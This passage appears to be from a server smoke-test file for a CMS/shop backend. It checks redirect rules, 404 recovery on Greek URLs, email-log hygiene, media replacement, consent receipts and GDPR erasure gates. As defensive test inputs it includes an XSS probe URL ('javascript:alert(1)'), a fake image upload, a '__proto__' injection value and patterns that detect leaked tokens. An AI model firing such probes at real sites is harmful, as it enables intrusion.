    else fail('redirect query carry', `Location=${withClick.headers.get('location')}`);

    // --- a 410 does NOT become a 301 ---
    const goneRule = await mkRule({
      match: '/legacy-smoke-spam', target: '', status: 410, enabled: true,
    });
    if (goneRule.ok) ok('redirects: a 410 rule can be created with no destination');
    else fail('410 rule create', `status=${goneRule.status}`);

    const hit410 = await fetch(`${BASE}/legacy-smoke-spam`, { redirect: 'manual' });
    if (hit410.status === 410) ok('redirects: a 410 entry answers 410');
    else fail('410 status', `expected 410, got ${hit410.status}`);
    if (!hit410.headers.get('location')) ok('redirects: ...and carries no Location (never a soft 404)');
    else fail('410 leaked a redirect', `Location=${hit410.headers.get('location')}`);

    const goneWithClick = await fetch(`${BASE}/legacy-smoke-spam?gclid=xyz`, { redirect: 'manual' });
    if (goneWithClick.status === 410 && !goneWithClick.headers.get('location'))
      ok('redirects: a 410 stays 410 even with a click id attached');
    else fail('410 with query', `status=${goneWithClick.status} loc=${goneWithClick.headers.get('location')}`);

    // --- the admin is not redirectable, by anyone, ever ---
    const evil = await mkRule({ match: '/admin/users', target: '/blog', status: 301, enabled: true });
    if (evil.status === 400 || evil.status === 422) ok('redirects: /admin cannot be redirected');
    else fail('admin redirect accepted', `status=${evil.status} — a rule could lock the shop out of its own CMS`);
    const evilApi = await mkRule({ match: '/api/posts', target: '/blog', status: 301, enabled: true });
    if (evilApi.status === 400 || evilApi.status === 422) ok('redirects: /api cannot be redirected');
    else fail('api redirect accepted', `status=${evilApi.status}`);
    const evilAll = await mkRule({ match: '/*', target: '/blog', status: 301, enabled: true });
    if (evilAll.status === 400 || evilAll.status === 422) ok('redirects: /* is refused');
    else fail('catch-all redirect accepted', `status=${evilAll.status}`);
    // The page that merely looks like the admin is an ordinary page.
    const lookalike = await mkRule({ match: '/administrators-guide', target: '/blog', status: 301, enabled: true });
    if (lookalike.ok) ok('redirects: /administrators-guide is an ordinary page and can be redirected');
    else fail('lookalike refused', `status=${lookalike.status}`);

    // --- the recovery page is helpful AND still a 404 ---
    const dead = await fetch(`${BASE}/product-category/no-such-thing-at-all`);
    const deadBody = await dead.text();
    if (dead.status === 404) ok('recovery: a URL that will never exist still answers 404');
    else fail('soft 404', `expected 404, got ${dead.status} — a 200 here gets the address indexed`);
    if (deadBody.includes('Page not found')) ok('recovery: ...and still serves a helpful page');
    else fail('recovery page body', 'the 404 body was not the recovery page');
    if ((dead.headers.get('cache-control') || '').includes('no-store'))
      ok('recovery: the 404 is not cached (a URL that starts working must not stay dead)');
    else fail('404 caching', `Cache-Control=${dead.headers.get('cache-control')}`);

    // --- the matching endpoint, on percent-encoded Greek ---
    // The form Google actually indexed on the old WordPress shops. If the
    // endpoint fails to decode it, every Greek legacy URL recovers nothing.
    const greek = '/product-category/' + encodeURIComponent('γυναικεία') + '-' + encodeURIComponent('γυαλιά');
    const m1 = await fetch(`${BASE}/api/recovery/match?path=${encodeURIComponent(greek)}`);
    const m1j = await m1.json().catch(() => ({}));
    if (m1.status === 200) ok('recovery: the matching endpoint answers');
    else fail('recovery endpoint', `status=${m1.status}`);
    const tokens = m1j?.meta?.tokens ?? [];
    const latin = m1j?.meta?.latin ?? [];
    // Decoded: the raw path was %CE%B3%CF%85..., so a Greek word here proves the
    // endpoint percent-decoded rather than tokenising the escapes.
    if (Array.isArray(tokens) && tokens.includes('γυναικεια'))
      ok('recovery: percent-encoded Greek is decoded and accent-folded');
    else fail('greek decoding', `tokens=${JSON.stringify(tokens)} (expected the decoded Greek word)`);
    // Transliterated: this is the form compared against a Latin slug, which is
    // how a Greek legacy URL finds gynaikeia-gyalia-iliou.
    if (Array.isArray(latin) && latin.includes('gynaikeia'))
      ok('recovery: ...and transliterated to Latin for matching against slugs');
    else fail('greek transliteration', `latin=${JSON.stringify(latin)} (expected gynaikeia)`);

    // An empty result is a real answer. Padding it is how a shop earns a
    // soft-404 and loses the shopper's trust in the same page load.
    const m2 = await fetch(`${BASE}/api/recovery/match?path=/xyzzy-plugh-quux-nothing`);
    const m2j = await m2.json().catch(() => ({}));
    if (m2.status === 200 && Array.isArray(m2j.data) && m2j.data.length === 0)
      ok('recovery: nonsense matches nothing rather than something random');
    else fail('recovery padding', JSON.stringify(m2j).slice(0, 200));

    // S5.10: matching costs tokens × catalogue, so a path of thousands of
    // words is cut to twelve meaningful tokens before any of it is compared.
    const longPath = '/' + Array.from({ length: 1500 }, (_, i) => `w${i}q`).join('-');
    const m3 = await fetch(`${BASE}/api/recovery/match?path=${encodeURIComponent(longPath)}`);
    const m3j = await m3.json().catch(() => ({}));
    if (m3.status === 200 && Array.isArray(m3j?.meta?.tokens) && m3j.meta.tokens.length <= 12) {
      ok('recovery: a 1500-word path is matched on at most 12 tokens');
    } else fail('recovery token cap', `status=${m3.status} tokens=${m3j?.meta?.tokens?.length}`);

    // --- the dead URL reached the report ---
    // GET flushes the buffered counters first, so a report opened right after a
    // hit is not mysteriously empty.
    const report = await fetch(`${BASE}/api/not-found`, { headers: { Cookie: sessionCookie } });
    const reportJson = await report.json().catch(() => ({}));
    const rows = Array.isArray(reportJson.data) ? reportJson.data : [];
    if (report.status === 200) ok('404 report: staff can read it');
    else fail('404 report', `status=${report.status}`);
    if (rows.some((r) => r.path === '/product-category/no-such-thing-at-all'))
      ok('404 report: the dead URL was recorded');
    else fail('404 report missing the hit', rows.map((r) => r.path).join(',').slice(0, 200));

    // Paid clicks are the column a shop sorts by, so they have to be counted.
    await fetch(`${BASE}/product-category/paid-dead-end?srsltid=abc999`);
    const report2 = await fetch(`${BASE}/api/not-found?sort=paid`, { headers: { Cookie: sessionCookie } });
    const rows2 = (await report2.json().catch(() => ({}))).data ?? [];
    const paidRow = rows2.find((r) => r.path === '/product-category/paid-dead-end');
    if (paidRow && paidRow.paid_hits >= 1) ok('404 report: a Shopping click on a dead URL is counted as paid');
    else fail('paid click accounting', JSON.stringify(paidRow ?? rows2.slice(0, 3)));

    // The report is staff-only: it is a list of every address a stranger has
    // probed, which is reconnaissance if it leaks.
    const anonReport = await fetch(`${BASE}/api/not-found`);
    if (anonReport.status === 401 || anonReport.status === 403)
      ok('404 report: anonymous callers cannot read it');
    else fail('404 report leak', `anonymous GET returned ${anonReport.status}`);
    const anonWrite = await fetch(`${BASE}/api/redirects`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ match: '/anon', target: '/blog', status: 301 }),
    });
    if (anonWrite.status === 401 || anonWrite.status === 403)
      ok('redirects: anonymous callers cannot create rules');
    else fail('redirect write leak', `anonymous POST returned ${anonWrite.status}`);
  }

  // ---- the translation backlog ----
  {
    const anon = await fetch(`${BASE}/api/i18n/status`);
    if (anon.status === 401 || anon.status === 403) ok('translations: anonymous callers are refused');
    else fail('translation status leak', `anonymous GET returned ${anon.status}`);

    if (sessionCookie) {
      const res = await fetch(`${BASE}/api/i18n/status`, { headers: { Cookie: sessionCookie } });
      const d = (await res.json().catch(() => null))?.data;
      if (res.status === 200 && d) ok('translations: staff can read the backlog');
      else fail('translation status', `expected 200, got ${res.status}`);

      if (typeof d?.defaultLocale === 'string' && Array.isArray(d?.locales)) {
        ok('translations: the configured languages are reported');
      } else fail('translation locales', JSON.stringify(d ?? null).slice(0, 140));

      if (Array.isArray(d?.posts) && Array.isArray(d?.products) && Array.isArray(d?.partial)) {
        ok('translations: articles, products and part-translated records are all reported');
      } else fail('translation shape', JSON.stringify(d ?? null).slice(0, 160));

      // A single-language install has no gaps to report, and must say that
      // rather than reporting everything as untranslated.
      if (d.locales.length === 1 && d.posts.length === 0) {
        ok('translations: a single-language site reports no backlog at all');
      } else if (d.locales.length > 1) {
        ok('translations: this install is multilingual, so gaps are computed');
      } else fail('single-locale backlog', JSON.stringify(d.posts).slice(0, 120));

      const screen = await fetch(`${BASE}/admin/translations`, { headers: { Cookie: sessionCookie } });
      if (screen.status === 200) ok('translations: the admin screen answers');
      else fail('translations screen', `expected 200, got ${screen.status}`);
    }
  }

  // ---- background jobs: the scheduler and the outbound email log ----
  //
  // Two questions that were previously answerable only by reading server logs.
  // What matters here is that the answers are true and that the log does not
  // become a store of the things it carries.
  {
    const anon = await fetch(`${BASE}/api/operations`);
    if (anon.status === 401 || anon.status === 403) ok('background jobs: anonymous callers are refused');
    else fail('operations leak', `anonymous GET returned ${anon.status}`);

    if (sessionCookie && csrfToken) {
      const authed = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };

      // Send something, so the log has a row that this test put there.
      await fetch(`${BASE}/api/auth/forgot`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
        body: JSON.stringify({ email: 'admin@local' }),
      });
      // Both the send and the log write are fire-and-forget on the server, so
      // poll for the row rather than sleeping a guessed interval — a fixed
      // sleep is either flaky on a loaded machine or slow on every run.
      let data = null;
      for (let i = 0; i < 40; i += 1) {
        const probe = await fetch(`${BASE}/api/operations?limit=20`, { headers: { Cookie: sessionCookie } });
        data = (await probe.json().catch(() => null))?.data;
        if ((data?.email?.recent ?? []).length > 0) break;
        await wait(100);
      }

      const res = await fetch(`${BASE}/api/operations?limit=20`, { headers: { Cookie: sessionCookie } });
      data = (await res.json().catch(() => null))?.data ?? data;
      if (res.status === 200 && data?.scheduler && data?.email) {
        ok('background jobs: an admin sees the scheduler and the mailer');
      } else fail('operations shape', `status ${res.status}`);

      if (typeof data?.scheduler?.enabled === 'boolean'
        && typeof data?.scheduler?.intervalMs === 'number'
        && 'startedAt' in data.scheduler) {
        ok('background jobs: the scheduler reports whether it is actually running HERE');
      } else fail('scheduler status', JSON.stringify(data?.scheduler ?? null).slice(0, 160));

      if (typeof data?.scheduler?.scheduled === 'number' && typeof data?.scheduler?.overdue === 'number') {
        ok('background jobs: ...and how many posts are waiting or overdue');
      } else fail('scheduler counts', JSON.stringify(data?.scheduler ?? null).slice(0, 160));

      // Multi-instance (UPGRADE.md U-19). This server is the only process on
      // its database, so once its scheduler has started it must hold the
      // scheduler lease — a `follower` here would mean nothing is sweeping.
      if (data?.scheduler?.startedAt
        ? data.scheduler.role === 'leader' && data.scheduler.lease?.leading === true
          && typeof data.scheduler.sweeps === 'number' && data.scheduler.sweeps > 0
        : data?.scheduler?.role === null) {
        ok('background jobs: the only process on the database holds the scheduler lease');
      } else fail('scheduler lease', JSON.stringify(data?.scheduler ?? null).slice(0, 240));

      if (data?.backup && data.backup.configured === false) {
        ok('background jobs: the off-site backup section is present (not configured here)');
      } else fail('backup section', JSON.stringify(data?.backup ?? null).slice(0, 160));

      const log = data?.email?.recent ?? [];
      if (log.length >= 1) ok('background jobs: sends are recorded in the log');
      else fail('email log empty', 'nothing recorded after a password-reset request');

      const entry = log[0];
      if (entry && entry.to && entry.subject && entry.transport && typeof entry.ok === 'boolean') {
        ok('background jobs: an entry says who, what, how and whether it worked');
      } else fail('email log entry', JSON.stringify(entry ?? null).slice(0, 160));

      // The property worth protecting. Password-reset links, magic sign-in
      // links and invoices all go through this sender.
      const serialised = JSON.stringify(log);
      if (!/"text"|"html"|"body"/.test(serialised)) {
        ok('background jobs: the log never carries the message body');
      } else fail('email body logged', serialised.slice(0, 160));
      // ...and specifically not a live token.
      if (!/token=|\/api\/auth\/magic|reset-password\?/.test(serialised)) {
        ok('background jobs: ...so no live sign-in or reset link is sitting in it');
      } else fail('token in email log', 'a link with a token reached the log');

      // The screen itself.
      // Off-site backup is opt-in and this test server has no bucket. The
      // honest answer is "not configured" — a green tick over nothing would be
      // the worst possible thing for a backup screen to show.
      if (data?.backup?.configured === false) {
        ok('background jobs: an unconfigured backup says so rather than looking healthy');
      } else fail('backup status', JSON.stringify(data?.backup ?? null).slice(0, 140));
      // And no credential may appear in a response that goes to a browser.
      if (!/secret|accessKey|SecretAccessKey/i.test(JSON.stringify(data?.backup ?? {}))) {
        ok('background jobs: the backup status carries no credentials');
      } else fail('backup credentials leaked', JSON.stringify(data.backup).slice(0, 140));

      const screen = await fetch(`${BASE}/admin/operations`, { headers: { Cookie: sessionCookie } });
      if (screen.status === 200) ok('background jobs: the admin screen answers');
      else fail('operations screen', `expected 200, got ${screen.status}`);
    }
  }

  // ---- replacing a media file in place ----
  //
  // The library-level behaviour (references rewritten, shared files kept) is
  // covered on all three drivers by tests/media-replace.test.mjs. What only a
  // running server shows is the door: who may replace what.
  if (sessionCookie && csrfToken) {
    const authed = { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`, 'X-CSRF-Token': csrfToken };

    // Its own fixture: the one at the top of the file is scoped to that block,
    // and reaching for it from here would be a variable that happens to be in
    // scope rather than a dependency this section states.
    const makePng = async (w, h, r) => {
      try {
        const sm = await import('sharp');
        const sharpFn = sm.default ?? sm;
        return await sharpFn({ create: { width: w, height: h, channels: 3, background: { r, g: 80, b: 120 } } })
          .png().toBuffer();
      } catch { return null; }
    };
    const pngFixture = await makePng(600, 400, 200);
    if (!pngFixture) {
      ok('media replace: skipped (sharp unavailable in this environment)');
    } else {

    const up = new FormData();
    up.set('file', new Blob([pngFixture], { type: 'image/png' }), 'replace-me.png');
    const created = await (await fetch(`${BASE}/api/media/upload`, {
      method: 'POST', headers: authed, body: up,
    })).json().catch(() => null);
    const mediaId = created?.data?.id;

    if (mediaId) {
      const anon = new FormData();
      anon.set('id', mediaId);
      anon.set('file', new Blob([pngFixture], { type: 'image/png' }), 'x.png');
      const anonRes = await fetch(`${BASE}/api/media/replace`, { method: 'POST', body: anon });
      if (anonRes.status === 401 || anonRes.status === 403) {
        ok('media replace: anonymous callers are refused');
      } else fail('media replace leak', `anonymous POST returned ${anonRes.status}`);

      const noId = new FormData();
      noId.set('file', new Blob([pngFixture], { type: 'image/png' }), 'x.png');
      const noIdRes = await fetch(`${BASE}/api/media/replace`, { method: 'POST', headers: authed, body: noId });
      if (noIdRes.status === 400) ok('media replace: a request naming no file to replace is refused');
      else fail('media replace no id', `expected 400, got ${noIdRes.status}`);

      const ghost = new FormData();
      ghost.set('id', 'no-such-media-id');
      ghost.set('file', new Blob([pngFixture], { type: 'image/png' }), 'x.png');
      const ghostRes = await fetch(`${BASE}/api/media/replace`, { method: 'POST', headers: authed, body: ghost });
      if (ghostRes.status === 404) ok('media replace: a record that does not exist is a 404');
      else fail('media replace ghost', `expected 404, got ${ghostRes.status}`);

      // A file that is not a file we accept must be refused by the SAME rules
      // an upload obeys — a replacement is an upload, not a second door.
      const hostile = new FormData();
      hostile.set('id', mediaId);
      hostile.set('file', new Blob(['just some text pretending'], { type: 'image/png' }), 'evil.png');
      const hostileRes = await fetch(`${BASE}/api/media/replace`, { method: 'POST', headers: authed, body: hostile });
      if (hostileRes.status === 400) ok('media replace: bytes that are not a real image are refused');
      else fail('media replace hostile', `expected 400, got ${hostileRes.status}`);

      // ...and the real thing works, keeping the id.
      const bigger = await makePng(900, 500, 10);
      if (bigger) {
        const good = new FormData();
        good.set('id', mediaId);
        good.set('file', new Blob([bigger], { type: 'image/png' }), 'replacement.png');
        const goodRes = await fetch(`${BASE}/api/media/replace`, { method: 'POST', headers: authed, body: good });
        const goodJson = await goodRes.json().catch(() => null);
        if (goodRes.status === 200 && goodJson?.data?.id === mediaId) {
          ok('media replace: the record keeps its id');
        } else fail('media replace', `status ${goodRes.status}, id=${goodJson?.data?.id}`);
        if (goodJson?.data?.width === 900) ok('media replace: the new file’s dimensions are recorded');
        else fail('media replace dimensions', String(goodJson?.data?.width));
        if (goodJson?.data?.replaced) ok('media replace: the response reports what it rewrote');
        else fail('media replace report', JSON.stringify(goodJson?.data ?? null).slice(0, 120));

        // The new file is actually served.
        const fetched = await fetch(`${BASE}${goodJson.data.url}`);
        if (fetched.status === 200) ok('media replace: the new file is served over HTTP');
        else fail('media replace serving', `GET returned ${fetched.status}`);

        const audit = await (await fetch(`${BASE}/api/audit?limit=30`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
        if ((audit?.data ?? []).some((e) => e.action === 'media.replace')) {
          ok('media replace: it is audited, because it rewrites stored content');
        } else fail('media replace not audited', 'no media.replace event');
      }
    }
    }
  }

  // ---- consent receipts ----
  //
  // The trail that lets a shop demonstrate a decision was made (Article 7(1))
  // without collecting anything about who made it. What matters here: a
  // visitor can write one, only an admin can read them, and nothing
  // identifying reaches the record.
  {
    const anonHeaders = {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
      Cookie: `astrobaas_csrf=${csrfToken}`,
    };
    const rid = '77777777-8888-4999-8aaa-bbbbbbbbbbbb';

    const wrote = await fetch(`${BASE}/api/consent/receipt`, {
      method: 'POST', headers: anonHeaders,
      body: JSON.stringify({ id: rid, granted: ['analytics'], version: 1 }),
    });
    if (wrote.status === 200) ok('consent trail: a visitor with no account can record a decision');
    else fail('consent receipt write', `expected 200, got ${wrote.status}`);

    // THE BLOCKER regression: the banner records via navigator.sendBeacon,
    // which CANNOT set an X-CSRF-Token header. So the receipt MUST succeed with
    // NO CSRF header at all — the previous version 403'd every real visitor
    // while this test passed because it sent the header. This request carries
    // no X-CSRF-Token and no csrf cookie, exactly like a beacon.
    const beaconRid = '88888888-8888-4999-8aaa-cccccccccccc';
    const beacon = await fetch(`${BASE}/api/consent/receipt`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: beaconRid, granted: ['analytics'], version: 1 }),
    });
    if (beacon.status === 200) ok('consent trail: a beacon with NO csrf token is accepted (the production path)');
    else fail('consent beacon rejected', `sendBeacon-shaped POST returned ${beacon.status} — receipts would never record`);

    // An out-of-range version is refused rather than silently rewritten.
    const badVer = await fetch(`${BASE}/api/consent/receipt`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: '99999999-8888-4999-8aaa-dddddddddddd', granted: ['analytics'], version: 0 }),
    });
    if (badVer.status === 400) ok('consent trail: version 0 is refused, not laundered to the current version');
    else fail('consent bad version', `expected 400, got ${badVer.status}`);

    // The trail is evidence about everyone. It is not public.
    const peek = await fetch(`${BASE}/api/consent/receipt`);
    if (peek.status === 401 || peek.status === 403) {
      ok('consent trail: anonymous callers cannot read it');
    } else fail('consent trail leak', `anonymous GET returned ${peek.status}`);

    const peekOne = await fetch(`${BASE}/api/consent/receipt?id=${rid}`);
    if (peekOne.status === 401 || peekOne.status === 403) {
      ok('consent trail: ...not even one receipt by id');
    } else fail('consent receipt leak', `anonymous GET by id returned ${peekOne.status}`);

    const junk = await fetch(`${BASE}/api/consent/receipt`, {
      method: 'POST', headers: anonHeaders,
      body: JSON.stringify({ id: 'not-a-uuid', granted: ['analytics'] }),
    });
    if (junk.status === 400) ok('consent trail: a malformed receipt id is refused');
    else fail('consent receipt id', `expected 400, got ${junk.status}`);

    if (sessionCookie) {
      const read = await fetch(`${BASE}/api/consent/receipt?id=${rid}`, { headers: { Cookie: sessionCookie } });
      const readJson = await read.json().catch(() => null);
      if (read.status === 200) ok('consent trail: an admin can look a receipt up');
      else fail('consent receipt read', `expected 200, got ${read.status}`);

      const rec = readJson?.data;
      if (rec && rec.granted?.includes('analytics') && rec.granted?.includes('necessary')) {
        ok('consent trail: the decision is recorded, with necessary always included');
      } else fail('consent receipt content', JSON.stringify(rec ?? null).slice(0, 140));

      // The property the whole design rests on.
      if (rec && Object.keys(rec).sort().join() === 'created_at,granted,id,version') {
        ok('consent trail: the record holds ONLY the decision — no address, no fingerprint');
      } else fail('consent receipt carries more', Object.keys(rec ?? {}).join());

      // A body full of invented categories must not become a receipt claiming
      // consent to things that do not exist.
      const hostileId = '66666666-8888-4999-8aaa-bbbbbbbbbbbb';
      await fetch(`${BASE}/api/consent/receipt`, {
        method: 'POST', headers: anonHeaders,
        body: JSON.stringify({ id: hostileId, granted: ['analytics', 'everything', '__proto__', 42] }),
      });
      const hostile = await (await fetch(`${BASE}/api/consent/receipt?id=${hostileId}`, {
        headers: { Cookie: sessionCookie },
      })).json().catch(() => null);
      const g = hostile?.data?.granted ?? [];
      if (g.includes('analytics') && !g.includes('everything') && !g.includes('__proto__') && g.length === 2) {
        ok('consent trail: invented categories are dropped, not recorded as consented');
      } else fail('consent receipt hostile grants', JSON.stringify(g));

      const listed = await (await fetch(`${BASE}/api/consent/receipt?limit=10`, {
        headers: { Cookie: sessionCookie },
      })).json().catch(() => null);
      if (Array.isArray(listed?.data) && listed.data.length >= 2) {
        ok('consent trail: an admin sees the recent decisions');
      } else fail('consent trail list', JSON.stringify(listed?.data ?? null).slice(0, 120));
    }

    // A signed-in NON-ADMIN. The middleware only requires a session, so this is
    // the caller the handler's own role check exists for — an anonymous
    // request never reaches it, and testing with one measures the middleware.
    {
      const authorLogin = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'resettest@example.com', password: 'Rotated#Pass2' }),
      });
      const m = /astrobaas_session=([^;]+)/.exec(authorLogin.headers.get('set-cookie') || '');
      if (m) {
        const authorCookie = `astrobaas_session=${m[1]}`;
        const asAuthor = await fetch(`${BASE}/api/consent/receipt?limit=5`, {
          headers: { Cookie: authorCookie },
        });
        if (asAuthor.status === 403) ok('consent trail: a signed-in non-admin is refused');
        else fail('consent trail role gate', `author GET returned ${asAuthor.status}`);

        const subjectAsAuthor = await fetch(`${BASE}/api/privacy/subject?email=admin@local`, {
          headers: { Cookie: authorCookie },
        });
        if (subjectAsAuthor.status === 403) ok('data requests: a signed-in non-admin is refused');
        else fail('privacy role gate', `author GET returned ${subjectAsAuthor.status}`);

        const opsAsAuthor = await fetch(`${BASE}/api/operations`, { headers: { Cookie: authorCookie } });
        if (opsAsAuthor.status === 403) ok('background jobs: a signed-in non-admin is refused');
        else fail('operations role gate', `author GET returned ${opsAsAuthor.status}`);
      }
    }

    // The served banner script actually posts one.
    const js = await (await fetch(`${BASE}/consent.js`)).text();
    if (/\/api\/consent\/receipt/.test(js)) ok('consent trail: the banner records the decision it writes');
    else fail('consent receipt not posted', 'the served script never calls the endpoint');
    if (/rec\.r = newReceiptId\(\)/.test(js)) {
      ok('consent trail: the receipt id is generated in the visitor’s browser, not by the server');
    } else fail('consent receipt id origin', 'no browser-generated id in the served script');
  }

  // ---- data-subject requests ----
  //
  // This endpoint returns one named person's complete record — orders,
  // addresses, messages — from an email address alone, and erases it. What
  // matters against a running server is the DOOR and the safety catch.
  {
    const anon = await fetch(`${BASE}/api/privacy/subject?email=someone@example.com`);
    if (anon.status === 401 || anon.status === 403) {
      ok('data requests: anonymous callers are refused');
    } else fail('privacy read leak', `anonymous GET returned ${anon.status}`);

    const anonErase = await fetch(`${BASE}/api/privacy/subject`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
      body: JSON.stringify({ email: 'someone@example.com', confirm: 'ERASE' }),
    });
    if (anonErase.status === 401 || anonErase.status === 403) {
      ok('data requests: anonymous callers cannot erase anybody');
    } else fail('privacy erase leak', `anonymous POST returned ${anonErase.status}`);

    if (sessionCookie && csrfToken) {
      const authed = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };

      const lookup = await fetch(`${BASE}/api/privacy/subject?email=nobody-here@example.com`, {
        headers: { Cookie: sessionCookie },
      });
      const lookupJson = await lookup.json().catch(() => null);
      if (lookup.status === 200) ok('data requests: an admin can look an address up');
      else fail('privacy lookup', `expected 200, got ${lookup.status}`);
      if (lookupJson?.data?.orders?.length === 0 && lookupJson?.data?.customer === null) {
        ok('data requests: an address with nothing behind it returns an empty record, not an error');
      } else fail('privacy empty lookup', JSON.stringify(lookupJson?.data ?? null).slice(0, 140));

      const notAnEmail = await fetch(`${BASE}/api/privacy/subject?email=not-an-address`, {
        headers: { Cookie: sessionCookie },
      });
      if (notAnEmail.status === 400) ok('data requests: a malformed address is refused');
      else fail('privacy bad email', `expected 400, got ${notAnEmail.status}`);

      // The safety catch. An erasure cannot be undone, so it must not be
      // something a mistyped request performs.
      const unconfirmed = await fetch(`${BASE}/api/privacy/subject`, {
        method: 'POST', headers: authed,
        body: JSON.stringify({ email: 'nobody-here@example.com' }),
      });
      const unconfirmedJson = await unconfirmed.json().catch(() => null);
      if (unconfirmed.status === 400) ok('data requests: an erasure without the confirmation word is refused');
      else fail('privacy unconfirmed erase', `expected 400, got ${unconfirmed.status}`);
      if (/ERASE/.test(JSON.stringify(unconfirmedJson ?? {}))) {
        ok('data requests: ...and the message says what to send');
      } else fail('privacy confirm message', JSON.stringify(unconfirmedJson ?? {}).slice(0, 140));

      const wrongWord = await fetch(`${BASE}/api/privacy/subject`, {
        method: 'POST', headers: authed,
        body: JSON.stringify({ email: 'nobody-here@example.com', confirm: 'yes' }),
      });
      if (wrongWord.status === 400) ok('data requests: a near-miss confirmation is still refused');
      else fail('privacy loose confirm', `expected 400, got ${wrongWord.status}`);

      const confirmed = await fetch(`${BASE}/api/privacy/subject`, {
        method: 'POST', headers: authed,
        body: JSON.stringify({ email: 'nobody-here@example.com', confirm: 'ERASE' }),
      });
      const confirmedJson = await confirmed.json().catch(() => null);
      if (confirmed.status === 200) ok('data requests: a confirmed erasure runs');
      else fail('privacy erase', `expected 200, got ${confirmed.status}`);
      if (/Nothing was found/.test(JSON.stringify(confirmedJson ?? {}))) {
        ok('data requests: ...and reports honestly that there was nothing to erase');
      } else fail('privacy empty erase report', JSON.stringify(confirmedJson?.data ?? null).slice(0, 160));

      // Both directions are audited: a supervisory authority asking "when did
      // you action this?" is answered by the log, not by memory.
      const audit = await (await fetch(`${BASE}/api/audit?limit=50`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
      const events = (audit?.data ?? []).map((e) => e.action);
      if (events.includes('privacy.subject.export')) ok('data requests: the lookup is audited');
      else fail('privacy export not audited', events.slice(0, 8).join());
      if (events.includes('privacy.subject.erase')) ok('data requests: the erasure is audited');
      else fail('privacy erase not audited', events.slice(0, 8).join());

      // The screen exists and is admin-only.
      const screen = await fetch(`${BASE}/admin/privacy`, { headers: { Cookie: sessionCookie } });
      if (screen.status === 200) ok('data requests: the admin screen answers');
      else fail('privacy screen', `expected 200, got ${screen.status}`);
    }
  }

  // ---- relation and media fields ----
  //
  // The two field kinds that make a collection-only site real. Both are about
  // a promise the schema cannot keep on its own: `validate()` can say a value
  // looks like an id, and only the database can say whether it names anything.
  if (sessionCookie && csrfToken) {
    const authed = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };

    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: authed,
      body: JSON.stringify([
        {
          name: 'smoke-venue', label: 'Venue', visibility: 'public',
          fields: [{ name: 'name', rule: { type: 'string', min: 1, max: 100 } }],
        },
        {
          name: 'smoke-event', label: 'Event', visibility: 'public',
          fields: [
            { name: 'title', rule: { type: 'string', min: 1, max: 100 } },
            { name: 'venue', rule: { type: 'ref', to: 'smoke-venue' } },
            { name: 'poster', rule: { type: 'media', optional: true } },
            { name: 'happens_on', rule: { type: 'date', optional: true } },
            { name: 'more_at', rule: { type: 'url', optional: true } },
          ],
        },
      ]),
    });
    if (put.status === 200) ok('field kinds: a type with ref and media fields is accepted');
    else fail('field kinds PUT', `expected 200, got ${put.status}`);

    const venue = await (await fetch(`${BASE}/api/content/smoke-venue`, {
      method: 'POST', headers: authed, body: JSON.stringify({ name: 'The Old Warehouse' }),
    })).json().catch(() => null);
    const venueId = venue?.data?.id;
    if (venueId) ok('field kinds: the referenced record is created');
    else fail('venue create', JSON.stringify(venue)?.slice(0, 140));

    // A reference that resolves.
    const good = await fetch(`${BASE}/api/content/smoke-event`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({ title: 'Opening night', venue: venueId, happens_on: '2026-09-15' }),
    });
    if (good.status === 201) ok('field kinds: a record pointing at something real is accepted');
    else fail('ref accept', `expected 201, got ${good.status}`);

    // ...and one that does not. This is the whole point of the kind: without
    // the check the record saves and the venue is simply blank on the page.
    const dangling = await fetch(`${BASE}/api/content/smoke-event`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({ title: 'Nowhere', venue: 'no-such-venue-id' }),
    });
    const danglingJson = await dangling.json().catch(() => null);
    if (dangling.status === 400 || dangling.status === 422) {
      ok('field kinds: a dangling reference is REFUSED, not stored and forgotten');
    } else fail('dangling ref stored', `status ${dangling.status}`);
    if (/does not exist/.test(JSON.stringify(danglingJson ?? {}))) {
      ok('field kinds: ...and the message names the problem');
    } else fail('dangling ref message', JSON.stringify(danglingJson ?? {}).slice(0, 140));

    // The date and url kinds are the ones that used to be accepted and then
    // silently discarded. Reading the record back is the only proof that they
    // are stored, which is exactly the check that did not exist.
    const events = await (await fetch(`${BASE}/api/content/smoke-event`)).json().catch(() => null);
    const opening = (events?.data ?? []).find((e) => e.data?.title === 'Opening night');
    if (opening?.data?.happens_on === '2026-09-15') {
      ok('field kinds: a date field is actually STORED (it used to vanish)');
    } else fail('date field lost', JSON.stringify(opening?.data ?? null).slice(0, 160));
    if (opening?.data?.venue === venueId) ok('field kinds: the reference is stored as an id');
    else fail('ref not stored', JSON.stringify(opening?.data ?? null).slice(0, 160));

    // A url that is not http(s) must not reach a record — these get rendered
    // as links.
    const jsUrl = await fetch(`${BASE}/api/content/smoke-event`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({ title: 'XSS', venue: venueId, more_at: 'javascript:alert(1)' }),
    });
    if (jsUrl.status === 400 || jsUrl.status === 422) ok('field kinds: a javascript: URL is refused');
    else fail('javascript url accepted', `status ${jsUrl.status}`);

    // Media: the id is what is stored, the URL is what a reader gets.
